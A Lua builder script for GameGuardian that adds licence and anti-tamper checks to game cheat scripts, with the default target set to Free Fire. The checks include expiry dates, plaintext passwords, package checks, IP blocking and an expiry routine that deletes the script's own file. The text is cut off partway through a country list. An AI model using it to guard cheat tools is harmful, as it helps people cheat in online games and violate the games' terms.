g = {}
g.last = "/sdcard/"
g.info = nil
g.config = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("[^/]+$") .. "cfg"
g.data = loadfile(g.config)
if g.data ~= nil then
  g.info = g.data()
  g.data = nil
end
if g.info == nil then
  g.info = { g.last, g.last:gsub("/[^/]+$", "") }
end

while true do
  g.info = gg.prompt({
    ' Select file :', -- 1
    'Select folder  :',
    '🕒 Add date expire offline',
    '🔐 Add password',
    '🛡️ Add GG Version',
    '📝 Antirename',
    '🗳 Add package GameGuardian',
    '🎮 Add Package Game',
    '👩 Add Verify Human Mode',
    '🔑 Add login offline ',
    '🕗 block hours day',
    '📟 block months year',
    '📊 block days week',
    '📶 require root to start script',
    '📵 require sdk version Android',
    '📅 check expire date online',
    '📳 require arm 64 bit',
    '📱 block ip device',
    '🗂️ check file size',
    '⛔ restricted country',
    '🤥 fake values',
    '👀 Antiview',
    '#️⃣ AntiVPN'
  }, g.info, {
    'file', 
    'path',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox',
    'checkbox'
    
  }) 
  gg.saveVariable(g.info, g.config)
  g.last = g.info[1]
  if loadfile(g.last) == nil then
    gg.alert("Script not Found!")
    return
  else
    g.out = g.last:match("[^/]+$")
    g.out = g.out:gsub(".lua", ".Batman")
    g.out = g.info[2] .. "" .. g.out .. ".lua"
     checkk= g.out:match("^.+/(.+)$")
    
     local file, err = io.open(g.out, "r")  
if  file then
    os.remove(g.out)
    
    file:close()  
end
end
  
  local file = io.open(g.last, "r")
  local DATA = file:read('*a')
  file:close()
  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    if g.info[3] == true then
        local day = os.date("%d")
        exp_date = gg.prompt({
        "📆 Set Expired Date : ",
        "📝 Type Expired Message : "
    }, {os.date("%Y%m" .. day), "⚠️ Script Expired ⚠️️"}, {"number", "text"})
end
if not exp_date then
    gg.setVisible(true)
elseif exp_date[1] == nil then
    gg.alert("📆 Date Can Not Be Empty !")
    gg.setVisible(true)
else
    print("📅 Added Expired Date : True✔")
    local JJ = ""
        JJ = '\n if os.date("%Y%m%d") >= "' .. exp_date[1] .. '" then print("' .. exp_date[2] .. '") return gg.alert("' .. exp_date[2] .. '") end\n'
    local file = io.open(g.out, "a")
    if file then
        file:write(JJ)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
    end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[4] == true then
PASS = gg.prompt({
"🔐 Set Password For Script :",
"📝 Type Message For Wrong Password : "
}, {"","⚠️ Wrong Password, Try Again!!! ⚠️"},{
"text",
"text"})
end--if
if not PASS then
gg.setVisible(true)
elseif PASS[1] == nil then
gg.alert("⚠️ Input Password !")
gg.setVisible(true)
else
print("🔐 Added Password Script : True✔")
KK = '\nlocal CXY = "'.. PASS[1]..'"\nPASSW = gg.prompt({"🔒 Input password: "},{[1]=""},{[1]="text"})\n if not PASSW the﻿n print("'..PASS[2]..'")  return end\n if PASSW[1] == "" then gg.alert("❌Password Can Not Be Empty ❌") os.exit(print("❌Password Can Not Be Empty ❌"))end\n if PASSW[1] ~= CXY then print("'..PASS[2]..'")return end\nif PASSW[1] == CXY then gg.toast("🎉Wellcome🎉")end\n' 

local file = io.open(g.out, "a")
    if file then
        file:write(KK)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[5] == true then
VERSION = gg.prompt({
"🔐 Set Minimal GG Version : ",
"🗒️ Set Error GG Message :"
}, {gg.VERSION,"⚠️ Error GG VERSION ⚠️"}, {
"number",
"text"})
end--if
if not VERSION then
gg.setVisible(true)
elseif VERSION[1] == nil then
gg.alert("🛡️ Input Minimal Required GG Version !")
gg.setVisible(true)
else
print("🛡 Minimal Version Required : True✔")
LL = '\nlocal LynX = gg;local Xslow = LynX.VERSION;if Xslow ~= "'..VERSION[1] .. '" then print("'..VERSION[2]..'") return gg.alert("' ..VERSION[2].. '")end\n' 
local file = io.open(g.out, "a")
    if file then
        file:write(LL)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[6] == true then
NAME = gg.prompt({
"🗒️ Set Name For Script :",
"📝 Type Message For Name Changed :",
}, {g.out:match("[^/]+$"),
"⚠️ RENAME DETECTED ⚠️"}, {
"text",
"text"})
end
if not NAME then
gg.setVisible(true)
elseif NAME[1] == nil then
gg.alert("📝 Set Name Can Not Be Empty !")
gg.setVisible(true)
else
print("📝 Added Rename Blocker : True✔")
MM = '\nlocal HckUtdProtect = gg.getFile():match("[^/]+$")local tptd =  "'..NAME[1]..'"\nif HckUtdProtect ~= tptd then gg.copyText("'..NAME[1]..'")gg.setVisible(true) print("'..NAME[2]..'") return gg.alert("'..NAME[2].. '")end\n'
local file = io.open(g.out, "a")
    if file then
        file:write(MM)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[7] == true then
_Hacks_Unlimited_ = gg.prompt({
"✏️ Set Your Package GameGuardian",
"📝 Type Message If Package Is Wrong :"
}, {"com.GameGuardian.id","⚠ Use MY GG For Run This Script ⚠"},{
"text",
"text"})
end--if
if not _Hacks_Unlimited_ then
gg.setVisible(true)
elseif _Hacks_Unlimited_[1] == nil then
gg.alert("⚠️ Set Package GameGuardian Can Not Bd Empty!")
gg.setVisible(true)
else
print("⚠ SetPeckage GG : True√ ")
NN = '\nif gg.PACKAGE == "' .. _Hacks_Unlimited_[1] .. '" then\nelse\ngg.alert("' .. _Hacks_Unlimited_[2] .. '")\nprint("' .. _Hacks_Unlimited_[2] .. '")\nos.exit()\nend\n' 
local file = io.open(g.out, "a")
    if file then
        file:write(NN)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[8] == true then
_Hacks_Unlimited_g = gg.prompt({
"✏️ Set Package Game",
"📝 Type Message If Package Is Wrong :"
}, {"com.dts.freefireth","⚠ Use Script In Game ⚠"},{
"text",
"text"})
end--if
if not _Hacks_Unlimited_g then
gg.setVisible(true)
elseif _Hacks_Unlimited_g[1] == nil then
gg.alert("⚠️ Set Package GameGuardian Can Not Be Empty!")
gg.setVisible(true)
else
print("🎮 SetPeckage Game : True√ ")
OO = '\nif gg.getTargetInfo().processName ~= "'.._Hacks_Unlimited_g[1]..'" then\ngg.alert("'.._Hacks_Unlimited_g[2]..'")\nos.exit()\nend\n'
local file = io.open(g.out, "a")
    if file then
        file:write(OO)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[9] == true then
print("💀 Added Verify Human Mode")
print("")
PP = "local code = math.random(10000, 99999)\nlocal hmn = gg.prompt({'🔒 Input This Code to Verify: '..code..' !'},{[1]=''},{[1]='number'}) if not hmn then os.exit() end if hmn[1]..'1' == code..'1' then gg.toast('☑ Code correct!') else gg.alert('✖ Wrong Code!') os.exit() end\n" 
local file = io.open(g.out, "a")
    if file then
        file:write(PP)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[10] == true then
 LOGIN = gg.prompt({ "🕵 Sᴇᴛ Usᴇʀɴᴀᴍᴇ Fᴏʀ Sᴄʀɪᴘᴛ :",
 "🔐 Sᴇᴛ Pᴀssᴡᴏʀᴅ Fᴏʀ Sᴄʀɪᴘᴛ :", 
"📝 Tʏᴘᴇ Mᴇssᴀɢᴇ Fᴏʀ Sᴜᴄᴄᴇs Lᴏɢɪɴ :", }, 
{"Batman", "games","🎉 Sᴜᴄᴄᴇss Lᴏɢɪɴ! 🎉"}, 
{ "text", "text", "text"}) end if not LOGIN then 
gg.setVisible(true) else if LOGIN[1] == '' then gg.alert("⚠️ Usᴇʀɴᴀᴍᴇ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
gg.setVisible(true) elseif LOGIN[2] == '' then gg.alert("⚠️ Pᴀssᴡᴏʀᴅ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
gg.setVisible(true) else print("💀 Aᴅᴅᴇᴅ Lᴏɢɪɴ Oғғʟɪɴᴇ! 💀") 
QQ = "\n\nlocal Username = '"..LOGIN[1].."';local Password = '"..LOGIN[2].."'\nlocal LoginScript = gg.prompt({'🕵 Usᴇʀɴᴀᴍᴇ : ','🔐 Pᴀssᴡᴏʀᴅ 🔐 :'},nil,{'text','text'})\nif LoginScript == nil then print('❌ Lᴏɢɪɴ Cᴀɴᴄᴇʟᴇᴅ ❌')return end\nif LoginScript[1] == '' then gg.alert('⚠️ Usᴇʀɴᴀᴍᴇ  Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️') print('⚠️ Usᴇʀɴᴀᴍᴇ  Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ !⚠️')  os.exit() end\nif LoginScript[2] == '' then gg.alert('⚠️ Pᴀssᴡᴏʀᴅ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️') print('⚠️ Pᴀssᴡᴏʀᴅ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️') os.exit() end\nif LoginScript[1] ~= Username then gg.alert('❌ Wʀᴏɴɢ Usᴇʀɴᴀᴍᴇ! ❌')return else end\nif LoginScript[2] ~= Password then gg.alert('❌ Wʀᴏɴɢ Pᴀssᴡᴏʀᴅ! ❌')return else end\ngg.sleep(500)gg.toast('"..LOGIN[3].."')\ngg.sleep(500) gg.toast('"..LOGIN[3].."')\n\n"
local file = io.open(g.out, "a")
    if file then
        file:write(QQ)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if g.info[11] == true then
    HOUR = gg.prompt({
        "⏰ Sᴇᴛ Hᴏᴜʀ 1:",
        "⏰ Sᴇᴛ Hᴏᴜʀ 2:",
        "⏰ Sᴇᴛ Hᴏᴜʀ 3:",
    }, {"13", "14", "15"}, {"text", "text", "text"})
end

if not HOUR then 
    gg.setVisible(true) 
else 
    if HOUR[1] == '' then 
        gg.alert("⚠️ Hᴏᴜʀ 1 Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
        gg.setVisible(true) 
    elseif HOUR[2] == '' then 
        gg.alert("⚠️ Hᴏᴜʀ 2 Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
        gg.setVisible(true) 
    elseif HOUR[3] == '' then 
        gg.alert("⚠️ Hᴏᴜʀ 3 Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
        gg.setVisible(true) 
    else 
        
        local hora1 = HOUR[1]
        local hora2 = HOUR[2]
        local hora3 = HOUR[3]

        local RR = [[
local block_hour_day = {
    ["]] .. hora1 .. [["] = true,
    ["]] .. hora2 .. [["] = true,
    ["]] .. hora3 .. [["] = true,
}

local function verify(pais)
    return block_hour_day[pais]
end

local hour = os.date('%H')
if hour then
    if verify(hour) then
        gg.alert(" sᴄʀɪᴘᴛ ɴᴏᴡ ᴡᴏʀᴋ ᴛʜɪs ʜᴏᴜʀ")
        os.exit()
    else
        
    end
else
    gg.alert("❌ Fᴀɪʟᴇd ᴛᴏ ɢᴇᴛ hᴏᴜʀ")
    os.exit()
end
]]
        local file = io.open(g.out, "a")
        if file then
            file:write(RR)
            file:close()
            
        else
            gg.alert("❌ Error: Could not open file for writing.")
        end
    end
    end

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if g.info[12] == true then
    monther = gg.prompt({
        "⏰ Mᴏɴᴛʜ 1 (Jan):",
        "⏰ Mᴏɴᴛʜ 2 (Feb):",
        "⏰ Mᴏɴᴛʜ 3 (Mar):",
        "⏰ Mᴏɴᴛʜ 4 (Apr):",
        "⏰ Mᴏɴᴛʜ 5 (May):",
        "⏰ Mᴏɴᴛʜ 6 (Jun):",
        "⏰ Mᴏɴᴛʜ 7 (Jul):",
        "⏰ Mᴏɴᴛʜ 8 (Aug):",
        "⏰ Mᴏɴᴛʜ 9 (Sep):",
        "⏰ Mᴏɴᴛʜ 10 (Oct):",
        "⏰ Mᴏɴᴛʜ 11 (Nov):",
        "⏰ Mᴏɴᴛʜ 12 (Dec):"
    }, {false, false, false, false, false, false, false, false, false, false, false, false}, {"checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox"})
end

if not monther then 
    gg.setVisible(true) 
else 
    local selected_months = {}
    for i = 1, 12 do
        if monther[i] then
            table.insert(selected_months, i)  
        end
    end

    if #selected_months == 0 then
        gg.alert("⚠️ empty! ⚠️")
        gg.setVisible(true)
        return
    end

    print("✅ : ", table.concat(selected_months, ", "))

    
    local months = {
        "Jan", "Feb", "Mar", "Apr", "May", "Jun", 
        "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
    }
    
    local SS = "local block_month_year = {\n"
    for _, month_index in ipairs(selected_months) do
        SS = SS .. string.format('    ["%s"] = true,\n', months[month_index])
    end
    SS = SS .. "}\n\n"

    
    SS = SS .. [[
local function verify(month)
    return block_month_year[month]
end

local month = os.date('%b')
if month then
    if verify(month) then
        gg.alert("Mᴏɴᴛʜ ɪɴᴄᴏʀʀᴇᴛ, sᴄʀɪᴘᴛ ɴᴏᴡ ᴡᴏʀᴋ ᴛʜɪs ᴍᴏɴᴛʜ")
        os.exit()
    else
        print("✅ Sᴜᴄᴄᴇss")
    end
else
    gg.alert("❌ Fᴀɪʟᴇd ᴛᴏ ɢᴇᴛ mᴏɴᴛʜ")
    os.exit()
end
]]

    local file = io.open(g.out, "a") -- Use seu caminho para o arquivo aqui
    if file then
        file:write(SS)
        file:close()
    else
        gg.alert("❌ Erro: Não foi possível abrir o arquivo para escrita.")
    end
end

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
if g.info[13] == true then
    DAYY = gg.prompt({
        "⏰ Day 1 (Mon):",
        "⏰ Day 2 (Tue):",
        "⏰ Day 3 (Wed):",
        "⏰ Day 4 (Thu):",
        "⏰ Day 5 (Fri):",
        "⏰ Day 6 (Sat):",
        "⏰ Day 7 (Sun):"
    }, {false, false, false, false, false, false, false}, {"checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox"})
end

if not DAYY then 
    gg.setVisible(true) 
else 
    local selected_days = {}
    for i = 1, 7 do
        if DAYY[i] then
            table.insert(selected_days, i)  -- Adiciona o número do dia selecionado
        end
    end

    if #selected_days == 0 then
        gg.alert("⚠️ erro! ⚠️")
        gg.setVisible(true)
        return
    end

    local days = {
    "Mon",
    "Tue",
    "Wed",
    "Thu",
    "Fri",
    "Sat",
    "Sun"
}
    local TT = "local block_day_week = {\n"
    for _, day_index in ipairs(selected_days) do
        TT = TT .. string.format('    ["%s"] = true,\n', days[day_index])
    end
    TT = TT .. "}\n\n"
    TT = TT .. [[
local function verify(day)
    return block_day_week[day]
end

local day = os.date('%a')
if day then
    if verify(day) then
 gg.alert("day week incorrect, script no work this day")
        os.exit()
    else
        print("✅ Sucesso")
    end
else
    gg.alert("❌ error")
    os.exit()
end
]]
    
    local file = io.open(g.out, "a") 
    if file then
        file:write(TT)
        file:close()
    else
        gg.alert("❌ error")
    end
end

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if g.info[14] == true then
 UU = [[ file, err = io.open("/system/bin/su", "r")

if file then
    gg.alert("Rooted device! Starting the script...")
    file:close()
else
    gg.alert("Non-rooted device. This script requires a rooted device.")
    os.exit()
end

]]

local file = io.open(g.out, "a")
    if file then
        file:write(UU)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if g.info[15] == true then
    local sph = gg.prompt({
        "Android 5.0 (Lollipop)",
        "Android 5.1 (Lollipop)",
        "Android 6.0 (Marshmallow)",
        "Android 7.0 (Nougat)",
        "Android 7.1 (Nougat)",
        "Android 8.0 (Oreo)",
        "Android 8.1 (Oreo)",
        "Android 9.0 (Pie)",
        "Android 10",
        "Android 11",
        "Android 12",
        "Android 12L",
        "Android 13",
        "Android 14"
    }, {false, false, false, false, false, false, false, false, false, false, false, false, false, false}, 
    {"checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox"})

    if sph == nil then
        return
    else
        local sphr = "30" -- Android 11

        -- Comparação correta das opções selecionadas
        if sph[1] == true then
            sphr = "21"
        elseif sph[2] == true then
            sphr = "22"
        elseif sph[3] == true then
            sphr = "23"
        elseif sph[4] == true then
            sphr = "24"
        elseif sph[5] == true then
            sphr = "25"
        elseif sph[6] == true then
            sphr = "26"
        elseif sph[7] == true then
            sphr = "27"
        elseif sph[8] == true then
            sphr = "28"
        elseif sph[9] == true then
            sphr = "29"
        elseif sph[10] == true then
            sphr = "30"
        elseif sph[11] == true then
            sphr = "31"
        elseif sph[12] == true then
            sphr = "32"
        elseif sph[13] == true then
            sphr = "33"
        elseif sph[14] == true then
            sphr = "34"
        end

        local VB = [[
            local required_sdk = ]] .. sphr .. [[

            local original_sdk = gg.ANDROID_SDK_INT

            if original_sdk then
                if original_sdk == required_sdk then
                    print("correct SDK")
                else
                    local sdk_versions = {
                        ["21"] = "Android 5.0",
                        ["22"] = "Android 5.1",
                        ["23"] = "Android 6.0",
                        ["24"] = "Android 7.0",
                        ["25"] = "Android 7.1",
                        ["26"] = "Android 8.0",
                        ["27"] = "Android 8.1",
                        ["28"] = "Android 9.0",
                        ["29"] = "Android 10",
                        ["30"] = "Android 11",
                        ["31"] = "Android 12",
                        ["32"] = "Android 12L",
                        ["33"] = "Android 13",
                        ["34"] = "Android 14"
                    }
                    local required_version = sdk_versions[tostring(required_sdk)]
                    gg.alert("Please use " .. required_version .. " (API Level " .. required_sdk .. ") to execute this script.")
                    os.exit()
                end
            else
                gg.alert("Failed to get SDK.")
                os.exit()
            end
        ]]
        local file = io.open(g.out, "a")
        if file then
            file:write(VB)
            file:close()
            
        else
            gg.alert("❌ Error: Could not open file for writing.")
        end
    end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    if g.info[16] == true then
        local dayy = os.date("%d")
        exp_dater = gg.prompt({
        "📆 Set Expired Date : ",
        "📝 Type Expired Message : "
    }, {os.date("%Y%m" .. dayy), "⚠️ Script Expired ⚠️️"}, {"number", "text"})
end 
if not exp_dater then
    gg.setVisible(true)
elseif exp_dater[1] == nil then
    gg.alert("📆 Date Can Not Be Empty !")
    gg.setVisible(true)
else
    print("📅 Added Expired Date online : True✔")
    
    local XX = [[
        local response = gg.makeRequest('http://www.whatismyip.org')
    local dateHeader = response.headers['Date'][1]

    local day, month, year = dateHeader:match('(%d+)%s(%w+)%s(%d+)')

    local months = {
        Jan = 1, Feb = 2, Mar = 3, Apr = 4, May = 5, Jun = 6,
        Jul = 7, Aug = 8, Sep = 9, Oct = 10, Nov = 11, Dec = 12
    }
    month = months[month]

    local serverDate = tonumber(string.format('%04d%02d%02d', year, month, day))

    local ExpDate = ]]..exp_dater[1] ..[[

    local FileName = gg.getFile():match('[^/]+$')
    local NewName = '#NewFile.lua'

    if serverDate > ExpDate then
        os.rename(FileName, NewName)
        os.remove(NewName)
        gg.alert('Sᴄʀɪᴘᴛ Exᴘɪʀᴇᴅ!')
        gg.alert('this script is deleted bro!')
        os.exit()
    end
    ]]

 local file = io.open(g.out, "a")
    if file then
        file:write(XX)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
    end
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
if g.info[17] == true then
 UU = [[     local function checkTargetInfo()
    local targetInfo = gg.getTargetInfo()

    if not targetInfo then
        print('failed request info.')
        os.exit()
        return
    end

    for k, v in pairs(targetInfo) do
        --print(k .. ": " .. tostring(v))
    end

    if targetInfo.x64 then
        
    else
   
        print('no work in 32 bit')
        os.exit()
    end
end

checkTargetInfo()
]]

local file = io.open(g.out, "a")
    if file then
        file:write(UU)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
if g.info[18] == true then
    IPP = gg.prompt({
        "⏰ enter ip to block:",
        
    }, {"00.000.000"}, {"text"})
end

if not IPP then 
    gg.setVisible(true) 
else 
    if IPP[1] == '' then 
        gg.alert("⚠️ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
        gg.setVisible(true) 
    else 
      
        local ip1 = IPP[1]
       
        local RR = [[

       local ip = "]]..ip1..[[" 

local Link = "https://browserleaks.com/ip"
local bat = gg.makeRequest(Link).content

if not bat then
    gg.alert("Failed to retrieve the page.")
    os.exit()
end

local function extractDataIPFromHTML(html)
    local pattern = 'data%-ip%="([%d%.]+)"'
    local dataIP = html:match(pattern)
    return dataIP
end

local dataIP = extractDataIPFromHTML(bat)

if not dataIP then
    gg.alert("Error: Failed to extract IP.")
    os.exit()
else
end

if dataIP == ip then
    gg.alert("IP blocked.")
    os.exit()
else
end
]]

    local file = io.open(g.out, "a")
    if file then
        file:write(RR)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
end
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
if g.info[19] == true then
    FILE = gg.prompt({
        "✍️ enter file size example 33.00 KB ",
        
    }, {"948.00 B"}, {"text"})
end

if not FILE then 
    gg.setVisible(true) 
else 
    if FILE[1] == '' then 
        gg.alert("⚠️ Cᴀɴɴᴏᴛ Bᴇ Eᴍᴘᴛʏ! ⚠️") 
        gg.setVisible(true) 
    else 
      
        local ip1 = FILE[1]
       
        local RR = [[

local sizeOriginal = "]]..ip1..[[" 

local function formatSize(size)
    local units = {"B", "KB", "MB", "GB", "TB"}
    local unitIndex = 1
    while size >= 1024 and unitIndex < #units do
        size = size / 1024
        unitIndex = unitIndex + 1
    end
    return string.format("%.2f %s", size, units[unitIndex])
end

local function getFileSize(path)
    local file, err = io.open(path, "rb")
    if not file then
        return "Error opening file: " .. err
    end

    local content = file:read("*a")
    file:close()

    if not content then
        return "File empty or cannot load content."
    end

    local sizeInBytes = #content
    return formatSize(sizeInBytes)
end

local archive = gg.getFile()

local fileSize = getFileSize(archive)

if sizeOriginal ~= fileSize then
    gg.alert("Error, file modified")
    print(fileSize)
    os.exit()
else
end
]]
local file = io.open(g.out, "a")
    if file then
        file:write(RR)
        file:close()
    else
        gg.alert("❌ Error: Could not open file for writing.")
end
end
end
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
if g.info[20] == true then
local country_language_map = {
    AF = "AFGHANISTAN",
    AL = "ALBANIA",
    DZ = "ALGERIA",
    AS = "AMERICAN SAMOA",
    AD = "ANDORRA",
    AO = "ANGOLA",
    AI = "ANGUILLA",
    AG = "ANTIGUA AND BARBUDA",
    AR = "ARGENTINA",
    AM = "ARMENIA",
    AW = "ARUBA",
    AU = "AUSTRALIA",
    AT = "AUSTRIA",
    AZ = "AZERBAIJAN",
    BS = "BAHAMAS",
    BH = "BAHRAIN",
    BD = "BANGLADESH",
    BB = "BARBADOS",
    BY = "BELARUS",
    BE = "BELGIUM",
    BZ = "BELIZE",
    BJ = "BENIN",
    BM = "BERMUDA",
    BT = "BHUTAN",
    BO = "BOLIVIA",
    BA = "BOSNIA AND HERZEGOVINA",
    BW = "BOTSWANA",
    BV = "BOUVET ISLAND",
    BR = "BRAZIL",
    IO = "BRITISH INDIAN OCEAN TERRITORY",
    BN = "BRUNEI DARUSSALAM",
    BG = "BULGARIA",
    BF = "BURKINA FASO",
    BI = "BURUNDI",
    KH = "CAMBODIA",
    CM = "CAMEROON",
    CA = "CANADA",
    CV = "CAPE VERDE",
    KY = "CAYMAN ISLANDS",
    CF = "CENTRAL AFRICAN REPUBLIC",
    TD = "CHAD",
    CL = "CHILE",
    CN = "CHINA",
    CX = "CHRISTMAS ISLAND",
    CC = "COCOS (KEELING) ISLANDS",
    CO = "COLOMBIA",
    KM = "COMOROS",
    CG = "CONGO",
    CD = "CONGO, DEMOCRATIC REPUBLIC OF THE",
    CK = "COOK ISLANDS",
    CR = "COSTA RICA",
    CI = "COTE D'IVOIRE",
    HR = "CROATIA",
    CU = "CUBA",
    CW = "CURACAO",
    CY = "CYPRUS",
    CZ = "CZECH REPUBLIC",
    DK = "DENMARK",
    DJ = "DJIBOUTI",
    DM = "DOMINICA",
    DO = "DOMINICAN REPUBLIC",
    EC = "ECUADOR",
    EG = "EGYPT",
    SV = "EL SALVADOR",
    GQ = "EQUATORIAL GUINEA",
    ER = "ERITREA",
    EE = "ESTONIA",
    ET = "ETHIOPIA",
    FK = "FALKLAND ISLANDS",
    FO = "FAROE ISLANDS",
    FJ = "FIJI",
    FI = "FINLAND",
    FR = "FRANCE",
    GF = "FRENCH GUIANA",
    PF = "FRENCH POLYNESIA",
    TF = "FRENCH SOUTHERN TERRITORIES",
    GA = "GABON",
    GM = "GAMBIA",
    GE = "GEORGIA",
    DE = "GERMANY",
    GH = "GHANA",
    GI = "GIBRALTAR",
    GR = "GREECE",
    GL = "GREENLAND",
    GD = "GRENADA",
    GP = "GUADELOUPE",
    GU = "GUAM",
    GT = "GUATEMALA",
    GG = "GUERNSEY",
    GN = "GUINEA",
    GW = "GUINEA-BISSAU",
    GY = "GUYANA",
    HT = "HAITI",
    HM = "HEARD ISLAND AND MCDONALD ISLANDS",
    VA = "HOLY SEE",
    HN = "HONDURAS",
    HK = "HONG KONG",
    HU = "HUNGARY",
    IS = "ICELAND",
    IN = "INDIA",
    ID = "INDONESIA",
    IR = "IRAN",
    IQ = "IRAQ",
    IE = "IRELAND",
    IM = "ISLE OF MAN",
    IL = "ISRAEL",
    IT = "ITALY",
    JM = "JAMAICA",
    JP = "JAPAN",
    JE = "JERSEY",
    JO = "JORDAN",
    KZ = "KAZAKHSTAN",
    KE = "KENYA",
    KI = "KIRIBATI",
    KP = "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF",
    KR = "KOREA, REPUBLIC OF",
    KW = "KUWAIT",
    KG = "KYRGYZSTAN",
    LA = "LAO PEOPLE'S DEMOCRATIC REPUBLIC",
    LV = "LATVIA",
    LB = "LEBANON",
    LS = "LESOTHO",
    LR = "LIBERIA",
    LY = "LIBYA",
    LI = "LIECHTENSTEIN",
    LT = "LITHUANIA",
    LU = "LUXEMBOURG",
    MO = "MACAO",
    MK = "MACEDONIA",
    MG = "MADAGASCAR",
    MW = "MALAWI",
    MY = "MALAYSIA",
    MV = "MALDIVES",
    ML = "MALI",
    MT = "MALTA",
    MH = "MARSHALL ISLANDS",
    MR = "MAURITANIA",
    MU = "MAURITIUS",
    YT = "MAYOTTE",
    MX = "MEXICO",
    FM = "MICRONESIA",
    MD = "MOLDOVA",
    MC = "MONACO",
    MN = "MONGOLIA",
    ME = "MONTENEGRO",
    MS = "MONTSERRAT",
    MA = "MOROCCO",
    MZ = "MOZAMBIQUE",
    MM = "MYANMAR",
    NA = "NAMIBIA",
    NR = "NAURU",
    NP = "NEPAL",
    NL = "NETHERLANDS",
    NC = "NEW CALEDONIA",
    NZ = "NEW ZEALAND",
    NI = "NICARAGUA",
    NE = "NIGER",
    NG = "NIGERIA",
    NU = "NIUE",
    NF = "NORFOLK ISLAND",
    MP = "NORTHERN MARIANA ISLANDS",
    NO = "NORWAY",
    OM = "OMAN",
    PK = "PAKISTAN",
    PW = "PALAU",
    PS = "PALESTINE",
    PA = "PANAMA",
    PG = "PAPUA NEW GUINEA",
    PY = "PARAGUAY",
    PE = "PERU",
    PH = "PHILIPPINES",
    PN = "PITCAIRN",
    PL = "POLAND",
    PT = "PORTUGAL",
    PR = "PUERTO RICO",
    QA = "QATAR",
    RE = "REUNION",
    RO = "ROMANIA",
    RU = "RUSSIA",
    RW = "RWANDA",
    BL = "SAINT BARTHÉLEMY",
    SH = "SAINT HELENA",
    KN = "SAINT KITTS AND NEVIS",
    LC = "SAINT LUCIA",
    MF = "SAINT MARTIN",
